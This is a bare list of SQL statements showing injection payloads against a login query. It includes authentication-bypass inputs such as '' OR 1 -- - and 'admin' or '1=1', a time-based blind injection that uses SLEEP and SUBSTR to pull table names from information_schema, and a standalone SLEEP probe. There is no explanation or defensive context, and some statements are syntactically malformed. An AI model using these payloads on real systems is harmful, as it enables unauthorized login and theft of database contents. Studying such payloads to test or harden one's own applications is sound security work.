SELECT * from USER where USER = '' AND PASSWORD = ''

SELECT * from USER where USER = '' OR 1 -- -' AND PASSWORD = ''

SELECT * from USER where USER = 'admin' or '1=1' AND PASSWORD = ''

SELECT * from USER where USER = '' OR (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'  AND SLEEP(5)) -- ' AND PASSWORD = ''

SELECT 7754 FROM (SELECT(SLEEP(5)))information_schema 
